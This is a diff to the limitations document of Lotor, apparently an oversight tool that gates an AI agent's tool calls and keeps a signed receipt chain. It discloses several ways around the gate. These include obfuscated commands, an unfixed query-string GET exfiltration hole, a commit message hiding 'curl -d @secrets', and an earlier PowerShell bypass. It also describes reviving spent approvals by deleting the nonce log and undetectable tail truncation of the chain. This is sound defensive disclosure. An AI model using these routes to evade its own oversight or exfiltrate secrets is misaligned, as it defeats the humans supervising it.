@@ -10,6 +10,8 @@ Tamper-evidence begins at signing time. The log proves that *what was recorded* 
 
 Outbound activity is now captured live by a `PostToolUse` hook for egress-shaped tool calls (network requests, remote git operations, publish commands), using the same matchers the policy engine uses to decide what is gate-worthy. This is captured by the host at the moment the tool call completes, not reconstructed later from a transcript, which is a real improvement in attestation strength. It is still not wire-level capture: there is no network proxy, no TLS interception, and no independent verification that the tool's own implementation reported its outcome honestly. A tool that lies about its own `tool_response`, or an egress path this repo's matchers do not recognize, is not captured. True wire-level capture would require a network-boundary proxy, which is a larger architectural change and not in v1.
 
+Because the same matchers drive both capture and the `egress-other` gate, a gap in one is a gap in the other. A 2026-07-24 review closed several named gaps (`Invoke-RestMethod`/`irm`, `wget --post-file`/`--post-data`, `curl -T`). One deliberately remains: a plain GET carrying data in its query string, e.g. `curl https://host/collect?data=...`, is neither gated nor captured, because there is no flag to match on and gating every query-string GET would fire on ordinary API reads. Data leaving in a GET URL is the honest hole here, and it is the reason egress capture must not be read as complete.
+
 ## 3. No external anchoring in v1
 
 The chain is local-only. External anchoring (to a timestamp authority, blockchain, or other notary) is a planned later enhancement. In v1, tamper detection relies on local key custody and periodic manual export/offsite backup.
@@ -30,7 +32,7 @@ A firing that adds no new activity appends nothing, so repeated `SessionEnd` eve
 
 ## 6. Auto-capture is opt-in and hook-dependent
 
-Receipts are only written automatically if the `SessionEnd` hook is registered in your Claude Code settings. Installing the MCP server alone gives you the query, verify, and gate tools against an empty chain. Nothing is recorded until the hook is wired up or a transcript is ingested by hand.
+Receipts are written automatically only if Lotor's hooks are registered in your Claude Code settings. Four hooks now write to the chain: `SessionStart` opens a session record, `PreToolUse` records policy warnings and gated-action denials/approvals, `PostToolUse` records egress-shaped tool calls, and `SessionEnd` writes the session receipt. Installing the MCP server alone gives you the query, verify, and gate tools against an empty chain. Nothing is recorded until the hooks are wired up (see the README install steps) or a transcript is ingested by hand. Enforcement, likewise, only covers tool calls made after `PreToolUse` is registered and loading.
 
 ## 7. A receipt can be dropped under lock contention
 
@@ -56,7 +58,9 @@ The approval key is derived with PBKDF2 (600,000 iterations, SHA-256) from your 
 
 ## 11. The gate matches patterns, and patterns are evadable
 
-The `PreToolUse` hook enforces Lotor's policy by pattern-matching the tool name and `tool_input`. v1's threat model is the honest agent making a consequential move without sign-off: accident, overreach, a naively followed injected instruction. The gate is not designed to withstand an adversarial model that is engineering around the matcher; command-string matching can be evaded by obfuscation (e.g. building the verb from fragments, using a wrapper binary, or running the dangerous action through a non-`Bash` tool name). If you need adversarial-grade containment, this is not the layer to rely on.
+The `PreToolUse` hook enforces Lotor's policy by pattern-matching the tool name and `tool_input`. v1's threat model is the honest agent making a consequential move without sign-off: accident, overreach, a naively followed injected instruction. The gate is not designed to withstand an adversarial model that is engineering around the matcher; command-string matching can be evaded by obfuscation, for example building the verb from fragments or invoking through a wrapper binary that the matcher cannot see into. If you need adversarial-grade containment, this is not the layer to rely on.
+
+One evasion that used to belong on that list no longer does. Until 2026-07-24, running a dangerous action through a shell other than `Bash` (PowerShell on Windows) bypassed the command rules entirely, and for `self-mod` it did so in the default configuration, no obfuscation required. That was a defect, not an adversarial technique, and it is fixed: the command rules now key on the shape of the input, not the tool's name (see limit 21). It is called out here because earlier drafts of this entry listed "a non-`Bash` tool name" as an example of adversarial obfuscation, which understated it. It was not a clever evasion; it was the gate not being armed for the machine's own shell.
 
 A few honest corollaries that follow from the same shape:
 
@@ -185,9 +189,19 @@ request matches the action being attempted, that its nonce has not been used
 before, and its signature. It never checks the token's `timestamp` against the
 current time. A signed token is valid until its nonce is spent, however much
 time has passed since it was signed — an approval from a week ago for an
-action that is only now being attempted still verifies cleanly. Nonce-based
-replay protection is real (a used token cannot be reused), but there is no
+action that is only now being attempted still verifies cleanly. There is no
 freshness window: staleness alone is not a rejection reason in v1.
+
+Replay protection is real but conditional on one file. A used nonce is
+recorded by appending to `keys/approval-nonces.log`, and the check is a scan
+of that file. Since tokens never expire, deleting that log restores every
+token ever signed to validity. That file lives under `keys/`, which the
+`self-mod` rule now gates across every shell (fixed 2026-07-24; before that
+it was gated for `Bash` only), so erasing it through the tool layer requires a
+signature. A process with direct filesystem access, outside the gated tools,
+can still delete it, and the same residual applies to the chain itself (limit
+22). The log also grows without bound and is scanned linearly on every gated
+call.
 
 ## 17. A grant lets one signature cover many executions
 
@@ -253,27 +267,118 @@ from `grant-use` entries on the append-only chain and does not depend on the
 clock at all, so a grant with a clock-proof ceiling of 5 is bounded at 5 uses
 regardless of what the clock says.
 
-## 21. The self-mod rule matches strings in a command, not intent
+That bound holds under concurrency, but only because it was fixed to. An
+earlier version counted uses from a chain snapshot read *before* the lock and
+appended *after* it, so two overlapping gated calls under one grant could each
+observe the same count and each proceed, exceeding `maxActions` by the number
+of calls in flight. The check and the append now run together inside the
+chain lock (`appendReceiptGuarded`), so the count the decision uses is the
+same view the `grant-use` entry lands on. Regression guard:
+`test/grant-concurrency.test.js` fires a barrier-synchronised burst and
+asserts exactly `maxActions` approvals land; the pre-fix path was confirmed to
+exceed the ceiling under the same barrier.
 
-Observed directly on 2026-07-23 while working against the gate:
+## 21. The command rules match strings, not intent
 
-- **It cannot tell reading from writing.** A `grep` or `cat` of a protected
-  file is denied exactly like an edit, because both are commands containing
-  the same path. Reading through a tool the rule does not cover is not denied,
-  so the cost is inconsistent rather than uniformly high.
-- **Prose counts.** A command that merely *names* a protected path, for
-  example a commit message or a heredoc writing documentation about the gate,
-  matches and is denied. Writing about the gate looks identical to modifying
-  it.
-- **Copying the repository is not matched, editing the copy is.** `git clone`
-  of the whole tree, gate source included, is permitted because the command
-  names no protected path. Editing a protected filename inside that copy is
-  then denied, since matching is on the path rather than the location. The
-  copy is therefore not a route around the rule, but the asymmetry is not
-  something the rule was designed for.
+The rules that read a command line reason about its text, not about what it
+will do. That cuts both ways, and an adversarial review on 2026-07-24 found
+it cutting the wrong way in several rules at once. The under-gating defects
+that review found were fixed the same day; the over-gating that remains is
+by design. Both are recorded here, because a reader extending the rule set
+needs to know it matches text, and a reader trusting the gate needs to know
+where that was getting the answer wrong.
 
-None of this is evadable-by-accident in the limit 11 sense, and the failures
-lean toward denying too much rather than too little. It is recorded because
-the cost of the gate is not evenly distributed, and because anyone extending
-the rule set should know it reasons about text rather than about what a
-command will do.
+### Under-gating found and fixed, 2026-07-24
+
+Each of these let a dangerous command through. Each is closed, with a
+regression test named.
+
+- **`self-mod` fired only for the `Bash` tool.** Its matcher only ever read
+  `tool_input.command`, but the dispatcher gated it behind `toolName ===
+  'Bash'`. On Windows, where PowerShell is the primary shell, the gate's own
+  source, its policy, its hooks, and the receipt chain could be rewritten
+  unsigned in every mode. This was the most serious finding: not an
+  obfuscation an adversary had to construct, but the default configuration
+  failing to enforce. Fixed: `isSelfMod` routes any command-carrying tool
+  through the command matcher (`src/policy/index.js`). Guard:
+  `test/selfmod-covers-core.test.js` exercises Bash, PowerShell and Edit.
+- **`self-mod` protected only `src/gate` and `src/policy`.** The grant
+  verifier (`src/grant`), the hash chain (`src/chain`) and the store
+  (`src/store`) were ungated, though `core-paths.js` already treated them as
+  non-delegable. Two lists that were meant to agree had drifted. Fixed: the
+  self-mod fragment list now covers every core directory, and
+  `test/selfmod-covers-core.test.js` reads the real `core-paths` export and
+  fails if they drift again.
+- **`opaque-exec` was disabled by a read verb anywhere in the string.**
+  `.\deploy.ps1 -Type full` was read as containing the verb `type` (a
+  hyphen is a word boundary) and exempted, defeating the rule created for the
+  deploy incident. Fixed: the read-verb exemption must now LEAD its segment,
+  and the command is split on shell separators so `read a.ps1 && ./evil.ps1`
+  gates on the second segment.
+- **The destructive allowlist matched substrings.** `rm -rf ./templates`
+  was exempted because `temp` appears inside `templates`. Fixed: whole
+  path-segment equality; `templates`, `attempts` and `contemplation` gate.
+- **`egress-other` missed common exfiltration forms.** `Invoke-RestMethod`
+  / `irm` (the usual PowerShell API call), `wget --post-file` / `--post-data`,
+  and `curl -T` were unrecognised. Fixed: all added.
+- **A commit message hid an executable substitution.** `git commit -m
+  "$(curl -d @secrets ...)"` had its message blanked before matching, hiding
+  the curl the shell would run. Fixed: a message containing `$(...)`,
+  backticks or `${...}` is left intact so the matchers see it.
+- **The grant ceiling was not concurrency-safe.** See limit 20.
+
+### Over-gating that remains, by design
+
+These make the gate cost more than it strictly must. The direction is the
+safe one: a false denial costs a signature, a false allow costs the
+guarantee. They are recorded so the cost is not a surprise.
+
+- **Reading a protected file costs a signature.** `cat`, `grep` or `sed` of a
+  gated path is denied like an edit, because both are commands naming the
+  path. Reading through a tool the rule does not cover (the Read tool) is not
+  denied, so the cost is uneven rather than uniformly high.
+- **Prose naming a protected path trips the gate.** A commit message or a
+  heredoc that merely *mentions* the gate's source matches. Writing about the
+  gate looks, to a text matcher, like modifying it.
+- **A script the engine cannot read is treated as executable even when it is
+  only being read.** `opaque-exec` gates `sed -n 1,5p deploy.ps1` because
+  `sed` can also mutate in place (`sed -i`); it does not try to prove the
+  invocation is read-only.
+
+### Why the remaining over-gating is not simply relaxed
+
+The obvious relaxation, exempting commands that begin with a read verb, was
+tried on 2026-07-23 and opened a hole within minutes: only the first token
+was checked, so a read verb followed by a redirect could overwrite the file
+the rule protects. The suite caught it and it was reverted whole. A relaxation
+that is actually safe has to classify on whether a command can *mutate*,
+across an arbitrary shell string, where the mutation can hide inside a script
+the matcher cannot read. That is the wall `opaque-exec` exists to acknowledge.
+
+The standing rule for this matcher: crying wolf is the cheap failure, silence
+is the expensive one, and any change that makes it quieter has to answer what
+it now misses.
+
+## 22. Tamper-evidence detects alteration and head-truncation, not tail-truncation
+
+`verifyChain()` (`src/chain/index.js`) recomputes each entry's hash, checks its
+signature, checks that entry 0 carries the genesis constant, and checks that
+each entry's `prevHash` links to the one before it. Removing entries from the
+*head* breaks the genesis check and is caught. Removing entries from the
+*tail* is not: the remaining prefix is internally consistent, every hash and
+signature still verifies, and `seq` simply resumes from the shortened length.
+Nothing outside the file records how long the chain should be, so a truncated
+chain passes `npm run verify` clean.
+
+This needs no key. Deleting or truncating `chain.jsonl` through the tool layer
+now requires a signature, because `receipts/` is gated by `self-mod` across
+every shell (fixed 2026-07-24; before that, gated for `Bash` only). The
+residual is a process with direct filesystem access, outside the gated tools,
+which can truncate the tail and leave a chain that verifies. Closing that
+needs something the file cannot provide about itself: an external anchor (limit
+3) or an off-chain signed head-marker, and any purely local marker is itself a
+deletable file subject to the same move. It is not fixed in v1 because there is
+no honest local-only fix.
+
+Read a clean `verify` as "what remains has not been altered", never as
+"nothing was removed."
